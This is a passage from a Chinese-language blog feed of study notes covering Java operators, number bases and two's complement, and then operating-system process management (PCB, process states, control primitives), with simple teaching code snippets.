class="hljs-comment">// -10 % 3 =&gt; -10 - (-10) / 3 * 3 = -10 + 9 = -1</span><br><span class="hljs-comment">// 10 % -3 = 10 - 10 / (-3) * (-3) = 10 - 9 = 1</span><br><br>System.out.println(<span class="hljs-number">10</span> % <span class="hljs-number">3</span>); <span class="hljs-comment">//1</span><br>System.out.println(-<span class="hljs-number">10</span> % <span class="hljs-number">3</span>); <span class="hljs-comment">// -1</span><br>System.out.println(<span class="hljs-number">10</span> % -<span class="hljs-number">3</span>); <span class="hljs-comment">//1</span><br>System.out.println(-<span class="hljs-number">10</span> % -<span class="hljs-number">3</span>);<span class="hljs-comment">//-1</span><br></code></pre></td></tr></table></figure></li><li><p><code>++</code> ：自增。</p><ul><li>作为独立的语句使用,<code>++i</code>和<code>i++</code>都完全等价于<code>i = i + 1</code></li><li>作为表达式使用:<code>++i</code> 先自增后赋值；<code>i++</code>先赋值后自增</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//++的使用</span><br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>i++;<span class="hljs-comment">//自增 等价于 i = i + 1; =&gt; i = 11</span><br>++i;<span class="hljs-comment">//自增 等价于 i = i + 1; =&gt; i = 12</span><br>System.out.println(<span class="hljs-string">&quot;i=&quot;</span> + i);<span class="hljs-comment">//12</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> ++j; <span class="hljs-comment">//等价 j=j+1;k=j;</span><br>System.out.println(<span class="hljs-string">&quot;k=&quot;</span> + k + <span class="hljs-string">&quot;j=&quot;</span> + j);<span class="hljs-comment">//9  9</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> j++; <span class="hljs-comment">// 等价 k=j;j=j+1;</span><br>System.out.println(<span class="hljs-string">&quot;k=&quot;</span> + k + <span class="hljs-string">&quot;j=&quot;</span> + j);<span class="hljs-comment">//8 9</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>练习</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-comment">//i-&gt;1</span><br>i = i++; <span class="hljs-comment">//规则使用临时变量: (1) temp=i;(2) i=i+1;(3)i=temp;</span><br>System.out.println(i); <span class="hljs-comment">// 1</span><br><br><span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>i=++i; <span class="hljs-comment">//规则使用临时变量: (1) i=i+1;(2) temp=i;(3)i=temp;</span><br>System.out.println(i); <span class="hljs-comment">//2</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> i1++;<br>System.out.print(<span class="hljs-string">&quot;i=&quot;</span>+i); <span class="hljs-comment">//10</span><br>i = --i2;<br>System.out.print(<span class="hljs-string">&quot;i=&quot;</span>+i); <span class="hljs-comment">//19</span><br>System.out.println(<span class="hljs-string">&quot;i2=&quot;</span>+i2); <span class="hljs-comment">//19</span><br></code></pre></td></tr></table></figure><h2 id="关系运算符比较运算符">3.2 关系运算符（比较运算符）</h2><blockquote><p>关系运算符结果都为 <code>boolean</code> 型，要么是 <code>ture</code>要么是 <code>false</code>。其关系表达式经常用在 <code>if</code>结构的条件中或循环结构的条件中。</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311081136572.png"alt="image-20231108113644487" /><figcaption aria-hidden="true">image-20231108113644487</figcaption></figure><h3 id="使用细节">3.2.1 使用细节</h3><ol type="1"><li>关系运算符结果都是 <code>boolean</code> 型，要么是 <code>ture</code>，要么是 <code>false</code></li><li>关系运算符的表达式，称为<em>关系表达式</em></li><li>比较运算符 <code>==</code> 不要误写为 <code>=</code></li></ol><h2 id="逻辑运算符">3.3 逻辑运算符</h2><blockquote><p>用于连接多个条件（多个关系表达式），最终的结果也是一个<code>boolean</code> 值。</p></blockquote><ul><li><p><code>&amp;&amp;</code> ：短路与。<code>a</code> <code>b</code>同时为 <code>ture</code>，则结果为 <code>ture</code>，否则为<code>false</code>。</p></li><li><p><code>&amp;</code> ：逻辑与。<code>a</code> <code>b</code> 同时为<code>ture</code>，则结果为 <code>ture</code>，否则为<code>false</code>。</p><p><code>&amp;&amp;</code> 与 <code>&amp;</code> 的区别，在于<code>a &amp;&amp; b</code> 的场合，<code>a = false</code> 时，则<code>b</code> 不判断。而 <code>&amp;</code> 会完成判断。开发中多用<code>&amp;&amp;</code> ，因为其效率更高。</p></li><li><p><code>||</code> ：短路或。<code>a</code> <code>b</code> 任一为<code>ture</code>，则结果为 <code>ture</code>，否则为<code>false</code>。</p></li><li><p><code>|</code> ：逻辑或。<code>a</code> <code>b</code> 任一为<code>ture</code>，则结果为 <code>ture</code>，否则为<code>false</code>。</p><blockquote><p>两者的区别和<code>&amp;&amp;</code> 与 <code>&amp;</code>相似，若第一个为 <code>ture</code> ，则 <code>||</code>不会判断第二个。</p></blockquote></li><li><p><code>!</code> ：取反。<code>a</code> 为<code>ture</code>，则结果为 <code>false</code>。反之为<code>ture</code>。</p></li><li><p><code>^</code>：逻辑异或。<code>a</code> <code>b</code>不同，结果为 <code>ture</code>，否则为 <code>false</code>。</p></li></ul><h2 id="赋值运算符">3.4 赋值运算符</h2><blockquote><p>将某个运算后的值，赋给指定变量</p></blockquote><ul><li><p>基本赋值运算符：<code>=</code></p></li><li><p>复合赋值运算符：<code>+=</code> ; <code>-=</code> ;<code>*=</code> ; <code>/=</code> ; <code>%=</code> 等</p><blockquote><p><code>a += b</code> 等价于 <code>a = a + b</code>。其余同理。</p></blockquote></li></ul><h3 id="使用细节-1">3.4.1 使用细节</h3><ol type="1"><li><p>运算顺序从右往左。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> a + b + c;<span class="hljs-comment">// 先运行(a + b + c)，再结算int num =</span><br></code></pre></td></tr></table></figure></li><li><p>运算符左边只能是变量，右边可以是变量、表达式、常量值。</p></li><li><p>复合赋值运算符会进行类型转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; b += <span class="hljs-number">3</span>;<span class="hljs-comment">// 此时 b += 3 等价于 b = (byte)(b + 3)</span><br>b++;<span class="hljs-comment">// 同理</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="三元运算符">3.5 三元运算符</h2><blockquote><p>基本语法：<code>条件表达式 ? 表达式1 : 表达式2;</code></p><p>运算规则：如果条件表达式为 <code>ture</code>，运算的结果是表达式1；反之为表达式2。</p><p>口诀------一眼顶真</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">99</span>;<br><span class="hljs-comment">// 解读</span><br><span class="hljs-comment">// 1. a &gt; b 为 false</span><br><span class="hljs-comment">// 2. 返回 b--, 先返回 b 的值,然后再 b-1</span><br><span class="hljs-comment">// 3. 返回的结果是 99</span><br><span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> a &gt; b ? a++ : b--;<br>System.out.println(<span class="hljs-string">&quot;result=&quot;</span> + result); <span class="hljs-comment">//99</span><br>System.out.println(<span class="hljs-string">&quot;a=&quot;</span> + a); <span class="hljs-comment">//10</span><br>System.out.println(<span class="hljs-string">&quot;b=&quot;</span> + b); <span class="hljs-comment">//98</span><br></code></pre></td></tr></table></figure><h3 id="使用细节-2">3.5.1 使用细节</h3><ol type="1"><li><p>表达式1 和 表达式2要为可以赋给接受变量的类型（或可以自动转换，或进行强制转换）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a &gt; b ? (<span class="hljs-type">int</span>)<span class="hljs-number">1.1</span> : (<span class="hljs-type">int</span>)<span class="hljs-number">3.4</span>;<span class="hljs-comment">//可以的</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> a &gt; b ? a : b + <span class="hljs-number">3</span>;<span class="hljs-comment">//可以的，满足 int -&gt; double</span><br></code></pre></td></tr></table></figure></li><li><p>三元运算符可以转成 <code>if--else</code></p></li></ol><h2 id="运算符优先级">3.6 运算符优先级</h2><p><a href="https://c.biancheng.net/view/794.html">Java运算符优先级(biancheng.net)</a></p><h2 id="标识符">3.7 标识符</h2><blockquote><p>Java 对各种变量、方法和类等命名时使用的字符序列称为标识符</p><p>凡是自己可以起名字的地方都叫标识符<code>double height = 0.0;</code></p></blockquote><h3 id="命名规则">3.7.1 命名规则</h3><ol type="1"><li>标识符由 26 个大、小写英文字母，0 - 9 阿拉伯数字，_ 或 $符号组成。</li><li><strong>数字不能开头</strong>。错误示范：<code>int 3a = 1;</code></li><li>不能使用关键字和保留字（可以包含）。<ahref="https://www.w3schools.cn/java/java_ref_keywords.asp">Java 关键字(w3schools.cn)</a></li><li>严格区分大小写，长度无限制。</li><li>不能包含空格。</li><li>与多数编程语言不同。Java 可以用任何 Unicode字符（特殊字符除外）作为标识符。但不推荐这么做|</li></ol><h3 id="命名规范专业">3.7.2 命名规范(专业)</h3><ol type="1"><li>包名：多单词组成时所有字母都小写：aaa.bbb.ccc，比如：com.hsp.crm</li><li>类名、接口名：多单词组成时，采用大驼峰法，所有单词的首字母大写：XxxYyyZzz，比如：TankShotGame</li><li>变量名、方法名：多单词组成时，采小驼峰法（驼峰法），第一个单词首字母小写，第二个开始每个单词首字母大写：xxxYyyZzz</li><li>常量名：所有字母都大写。多单词时每个单词用下划线连接：XXX_YYY_ZZZ，比如：TAX_RATE</li><li>更详细的规则查看 <ahref="https://developer.aliyun.com/article/709470">Java编码规范</a></li></ol><h2 id="输入与输出">3.8 输入与输出</h2><blockquote><p>在编程中，需要接收用户输入的数据，就可以使用键盘输入语句来获取。<code>Input.java</code>, 需要一个 扫描器(对象), 就是<code>Scanner</code></p></blockquote><p><strong>步骤 ：</strong></p><ol type="1"><li>导入该类的所在包，java.util.*</li><li>创建该类对象（声明变量）</li><li>调用里面的功能</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner; <span class="hljs-comment">//表示把 java.util 下的 Scanner 类导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Input</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//Scanner 类 表示 简单文本扫描器，在 java.util 包</span><br><span class="hljs-comment">//1. 引入/导入 Scanner 类所在的包</span><br><span class="hljs-comment">//2. 创建 Scanner 对象 , new 创建一个对象</span><br><span class="hljs-comment">// myScanner 就是 Scanner 类的对象</span><br>        <br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-comment">//3. 接收用户输入，使用相关的方法</span><br>System.out.println(<span class="hljs-string">&quot;请输入名字&quot;</span>);<br>        <br><span class="hljs-comment">//当程序执行到 next 方法时，会等待用户输入~~~ </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> myScanner.next(); <span class="hljs-comment">//接收用户输入字符串</span><br>    <br>System.out.println(<span class="hljs-string">&quot;请输入年龄&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> myScanner.nextInt();  <span class="hljs-comment">//接收用户输入 int</span><br>System.out.println(<span class="hljs-string">&quot;请输入薪水&quot;</span>);<br><span class="hljs-type">double</span> <span class="hljs-variable">sal</span> <span class="hljs-operator">=</span> myScanner.nextDouble();  <span class="hljs-comment">//接收用户输入 double</span><br>System.out.println(<span class="hljs-string">&quot;人的信息如下:&quot;</span>);<br><br>System.out.println(<span class="hljs-string">&quot;名字=&quot;</span> + name + <span class="hljs-string">&quot; 年龄=&quot;</span> + age + <span class="hljs-string">&quot; 薪水=&quot;</span> + sal);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="进制">3.9 进制</h2><ul><li>二进制：数字有 0 - 1，满 2 进 1，以 <code>0b</code> 或<code>0B</code> 开头</li><li>十进制</li><li>八进制：0 - 7，满 8 进 1，以 <code>0</code> 开头表示</li><li>十六进制：0 - 9 及 A - F，满 16 进 1，以<code>0x</code> 或<code>0X</code> 开头。此处的 A - F 不分大小写。</li></ul><h3 id="进制的转换">3.9.1 进制的转换</h3><ul><li>其他进制转十进制：略</li><li>十进制转其他进制：将该数不断除以对象进制数，直到商为0为止，将每步得到的余数倒过来。</li><li>二进制与八进制或十六进制互相转换：二进制从低位开始，每 3位一组，转成对应的八进制即可。反之同理。十六进制每 4 位一组</li></ul><h3 id="原码反码补码背">3.9.2 原码、反码、补码（背）</h3><p>对于有符号数而言：</p><ol type="1"><li>二进制的最高位是符号位：0表示正数，1表示负数。(<code>0-&gt;0 1-&gt;-</code>)</li><li>正数的原码、反码、补码都一样。</li><li>负数的原码转反码：原码符号位不变，其他位取反；反码再转原码：反码符号位不变，其他位取反</li><li><strong>负数的补码 = 反码 + 1。负数的反码 = 补码 - 1。</strong></li><li>0 的反码、补码都是 0。</li><li>Java 没有无符号数。换言之，Java 的数都是有符号的。</li><li><strong>| 计算机运算时，都是以补码的方式来运算的。|</strong></li><li><strong>当我们看运算结果时，要看其原码。</strong></li></ol><h2 id="位运算符">3.10 位运算符</h2><ul><li><p><code>&amp;</code> 按位与：两位都为 1，结果为 1，否则为0</p></li><li><p><code>|</code> 按位或：两位有一个为 1，结果为 1，否则为0</p></li><li><p><code>^</code> 按位异或：两位不同，结果为 1，否则为 0</p></li><li><p><code>~</code> 按位取反：把 0 变 1，1 变 0</p><p>示例：</p><ul><li><p><code>2 &amp; 3</code>：</p><blockquote><p><code>int</code>类型是4个字节</p><p>2 的原码：00000000 00000000 00000000 00000010</p><p>2 的补码：00000000 00000000 00000000 00000010</p><p>3 的原码：00000000 00000000 00000000 00000011</p><p>3 的补码：00000000 00000000 00000000 00000011</p><p>补码运算结果：00000000 00000000 00000000 00000010</p><p>结果转成原码：00000000 00000000 00000000 00000010</p><p>运算结果：2</p></blockquote></li><li><p><code>~-2</code>：</p><blockquote><p>得到 -2 的原码：10000000 00000000 00000000 00000010</p><p>得到 -2 的反码：11111111 11111111 11111111 11111101</p><p>得到 -2 的补码：11111111 11111111 11111111 11111110</p><p>补码运算结果：00000000 00000000 00000000 00000001</p><p>结果转成原码：00000000 00000000 00000000 00000001</p><p>运算结果：1</p></blockquote></li><li><p><code>~2</code>：</p><blockquote><p>2 的原码：00000000 00000000 00000000 00000010</p><p>2 的补码：00000000 00000000 00000000 00000010</p><p>补码运算：11111111 11111111 11111111 11111101</p><p>结果转成反码：11111111 11111111 11111111 11111100</p><p>反码转成原码：10000000 00000000 00000000 00000011</p><p>运算结果：-3</p></blockquote></li></ul></li><li><p><code>&gt;&gt;</code>算术右移：低位溢出，符号位不变，用符号位补溢出的高位</p></li><li><p><code>&lt;&lt;</code> 算数左移：符号位不变，低位补 0</p></li><li><p><code>&gt;&gt;&gt;</code>逻辑右移（无符号右移）：低位溢出，高位补 0</p></li><li><p>没有<code>&lt;&lt;&lt;</code>符号</p><p>示例：</p><ul><li><p>将数字 1 算术右移 2 位：<code>int a = 1 &gt;&gt; 2</code></p><blockquote><p>1 的补码：00000000 00000000 00000000 00000001</p><p>补码结果：00000000 00000000 00000000 00000000</p><p>结果：00000000 00000000 00000000 00000000</p></blockquote></li><li><p>将数字 1 算术左移 2 位：<code>int b = 1 &lt;&lt; 2</code></p><blockquote><p>1 的补码：00000000 00000000 00000000 00000001</p><p>补码结果：00000000 00000000 00000000 00000100</p><p>结果：00000000 00000000 00000000 00000100</p></blockquote></li></ul><p>也就是说，<code>1 &lt;&lt; 2</code> 本质是<code>1 * 2 * 2 = 4</code></p><p>而 <code>1 &gt;&gt; 2</code> 本质是<code>1 / 2 / 2 = 0</code></p></li></ul><blockquote><p>参考：</p><p><ahref="https://www.bilibili.com/video/BV1fh411y7R8/?spm_id_from=333.337.search-card.all.click">【零基础快速学Java】韩顺平 零基础30天学会Java_哔哩哔哩_bilibili</a></p><p><ahref="https://i-melody.github.io/2021/11/23/Java/入门阶段/3%20运算符/">3运算符 ★ Melody 的小纸箱 (i-melody.github.io)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统 2 进程管理</title>
    <link href="/2023/11/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%202%20%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    <url>/2023/11/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%202%20%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>B站王道考研视频内容，结合《计算机操作系统（第四版）——汤小丹》课本做的笔记</p><p>王道的有些图做的确实很好，比较容易看懂</p></blockquote><h1 id="进程与线程">2.1 进程与线程</h1><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272241508.png"alt="image-20231127224148425" /><figcaption aria-hidden="true">image-20231127224148425</figcaption></figure><h2 id="进程的概念组成特征组织">2.1.1 进程的概念、组成、特征、组织</h2><h3 id="进程的概念">进程的概念</h3><p>在多道程序环境下，程序的执行属于并发执行，此时它们将<strong>失去其封闭性</strong>，并具有<strong>间断性</strong>，以及其<strong>运行结果不可再现性</strong>的特征。由此，决定了通常的程序是不能参与并发执行的，否则，程序的运行也就失去了意义。为了能使程序并发执行，并且可以对并发执行的程序加以描述和控制，人们引入了“进程”的概念。</p><p>为了使参与并发执行的每个程序(含数据)都能独立地运行，在操作系统中必须为之配置一个专门的数据结构，称为<strong>进程控制块(ProcessControlBlock，PCB)</strong>。系统利用PCB来描述进程的基本情况和活动过程，进而控制和管理进程。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272245700.png"alt="进程的概念" /><figcaption aria-hidden="true">进程的概念</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311271249005.png"alt="进程的概念" /><figcaption aria-hidden="true">进程的概念</figcaption></figure><p>进程和程序的区别和联系：</p><p>区别：</p><ol type="1"><li>进程是动态的;程序是静态的。</li><li>进程有独立性，能并发执行；程序不能并发执行。</li><li>二者无一一对应关系。</li><li>进程异步运行，会相互制约；程序不具备此特征。</li><li>组成不同。进程包含PCB、程序段、数据段。程序包含数据和指令代码。程序是一个包含了所有指令和数据的静态实体。本身除占用磁盘的存储空间外，并不占用系统如CPU、内存等运行资源。进程由程序段、数据段和PCB构成，会占用系统如CPU、内存等运行资源。</li></ol><p>但是，进程与程序又有密切的联系： 进程不能脱离具体程序而虚设，程序规定了相应进程所要完成的动作。</p><h3 id="进程的组成">进程的组成</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311271259596.png"alt="进程的组成" /><figcaption aria-hidden="true">进程的组成</figcaption></figure><p><strong>进程控制块PCB的作用</strong></p><ol type="1"><li><p>作为独立运行基本单位的标志</p></li><li><p>能实现间断性运行方式。</p></li><li><p>提供进程管理所需要的信息</p></li><li><p>提供进程调度所需要的信息</p></li><li><p>实现与其它进程的同步与通信</p></li></ol><p><strong>进程控制块（PCB）中的信息</strong></p><p>进程控制块中主要包括下述四个方面的信息。</p><p><strong>1.进程标识符：</strong></p><p>用于唯一地标识一个进程；通常有两种标识符：</p><ol type="1"><li>外部标识符(显示名称)，(2) 内部标识符(PID)</li></ol><p><strong>2.处理机状态：</strong></p><p>处理机的各种寄存器中的内容组成</p><p><strong>3.进程调度信息：</strong></p><p>① 进程状态：进程的当前状态，作为进程调度和对换时的依据；</p><p>②进程优先级：描述进程使用处理机的优先程度的一个整数，优先级高的进程应优先获得处理机；</p><p>③进程调度所需的其它信息：例如，进程已等待CPU的时间总和、进程已执行的时间总和等；</p><p>④事件：是指进程由执行状态变为阻塞状态所等待发生的事件，即阻塞原因。</p><p><strong>4.进程控制信息</strong></p><p>① 程序和数据的地址：进程实体中的程序和数据的内存或外存地(首)址；</p><p>②进程同步和通信机制：如消息队列指针、信号量等，它们可能全部或部分地放在PCB中；</p><p>③资源清单：进程在运行期间所需的全部资源(除CPU以外)；另外还有一张已分配到该进程的资源的清单；</p><p>④ 链接指针：给出本进程(PCB)所在队列中的下一进程的PCB首地址。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311271257067.png"alt="进程的组成-PCB" /><figcaption aria-hidden="true">进程的组成-PCB</figcaption></figure><h3 id="进程的特征">进程的特征</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311271300169.png"alt="image-20231127130059069" /><figcaption aria-hidden="true">image-20231127130059069</figcaption></figure><h3 id="进程的组织">进程的组织</h3><p>在一个操作系统中，通常可拥有数十个、数百个乃至数千个PCB，为了能对它们加以有效的管理，应该用适当的方式将这些PCB 组织起来。目前常用的组织方式有以下三种。</p><p><strong>(1)线性方式</strong>，即将系统中所有的 PCB都组织在一张线性表中，将该表的首址存放在内存的一个专用区域中。该方式实现简单、开销小，但每次查找时都需要扫描整张表，因此适合进程数目不多的系统。图2-10示出了线性表的PCB组织方式。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272314372.png"alt="进程的组织方式-线性方式" /><figcaption aria-hidden="true">进程的组织方式-线性方式</figcaption></figure><p><strong>(2) 链接方式</strong>，即把具有相同状态进程的 PCB分别通过PCB中的链接字链接成一个队列。这样，可以形成就绪队列、若干个阻塞队列和空白队列等。</p><p>对就绪队列而言，往往按进程的优先级将 PCB从高到低进行排列，将优先级高的进程PCB排在队列的前面。同样也可把处于阻塞状态进程的 PCB根据其阻塞原因的不同，排成多个阻塞队列，如等待I/O操作完成的队列和等待分配内存的队列等。图2-11示出了一种链接队列的组织方式</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272317499.png"alt="进程的组织-链接方式" /><figcaption aria-hidden="true">进程的组织-链接方式</figcaption></figure><p><strong>(3)索引方式</strong>：即系统根据所有进程状态的不同，建立几张索引表，例如，就绪索引表、阻塞索引表等，并把各索引表在内存的首地址记录在内存的一些专用单元中。在每个索引表的表目中，记录具有相应状态的某个PCB在PCB表中的地址。图2-12示出了索引方式的PCB组织。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272319746.png"alt="进程组织方式-索引方式" /><figcaption aria-hidden="true">进程组织方式-索引方式</figcaption></figure><h2 id="进程的状态及转换">2.1.2 进程的状态及转换</h2><h3 id="进程的状态">进程的状态</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272302615.png"alt="三种基本状态" /><figcaption aria-hidden="true">三种基本状态</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272303686.png"alt="另外两种状态" /><figcaption aria-hidden="true">另外两种状态</figcaption></figure><p>创建状态</p><ul><li>首先：由进程申请一个空白PCB，并向PCB中填写用于控制和管理进程的信息；</li><li>然后：为该进程分配运行时所必须的资源；</li><li>最后：把该进程转入就绪状态并插入就绪队列之中。</li></ul><p>如果进程所需的资源不能得到满足，比如无足够的内存使进程无法装入其中，此时创建工作尚未完成，进程不能被调度运行，于是把此时进程所处的状态称为创建状态。</p><p>终止状态</p><ul><li>首先：等待操作系统进行善后处理</li><li>最后：将其PCB清零，并将PCB空间返还操作系统</li></ul><p>当一个进程到达了自然结束点，或是出现了无法克服的错误，或是被操作系统所终结，或是被其他有终止权的进程所终结，它将进入<strong>终止状态</strong>。进入终止态的进程以后不能再执行，但在操作系统中依然保留一个记录，其中保存状态码和一些计时统计数据，供其他进程收集。一旦其他进程完成了对其信息的提取之后，操作系统将删除该进程，即将其PCB清零，将空白PCB返还系统。</p><h3 id="进程状态间的转换">进程状态间的转换</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272310509.png"alt="五状态转换图" /><figcaption aria-hidden="true">五状态转换图</figcaption></figure><h2 id="进程控制">2.1.3 进程控制</h2><h3 id="进程控制概念">进程控制概念</h3><p>进程控制是进程管理中最基本的功能，主要包括创建新进程、终止已完成的进程、将因发生异常情况而无法继续运行的进程置于阻塞状态、负责进程运行中的状态转换等功能。如当一个正在执行的进程因等待某事件而暂时不能继续执行时，将其转变为阻塞状态，而在该进程所期待的事件出现后，又将该进程转换为就绪状态等。进程控制一般是由OS 的内核中的<strong>原语</strong>来实现的。</p><p>简单说：<strong>进程控制就是要实现进程状态转换</strong></p><h3 id="原语实现对进程的控制">原语实现对进程的控制</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272349181.png"alt="原语实现对进程的控制" /><figcaption aria-hidden="true">原语实现对进程的控制</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272349922.png"alt="如何实现原语的“原子性”" /><figcaption aria-hidden="true">如何实现原语的“原子性”</figcaption></figure><p>思考：如果这两个特权指令允许用户程序使用的话，会发生什么情况？</p><p>------流氓程序，必须执行完它，才能执行其他的程序，这种是不被允许的</p><h3 id="进程控制的五种原语">进程控制的五种原语</h3><h4 id="进程的创建原语">进程的创建原语</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272352438.png"alt="进程的创建原语" /><figcaption aria-hidden="true">进程的创建原语</figcaption></figure><h4 id="进程的终止原语">进程的终止原语</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272354577.png"alt="进程的终止原语" /><figcaption aria-hidden="true">进程的终止原语</figcaption></figure><h4 id="进程的唤醒和阻塞原语">进程的唤醒和阻塞原语</h4><p>引起进程阻塞和唤醒的事件</p><ol type="1"><li><p>向系统请求共享资源失败。</p></li><li><p>等待某种操作的完成。</p></li><li><p>新数据尚未到达。</p></li><li><p>等待新任务的到达。</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280004416.png"alt="image-20231128000426318" /><figcaption 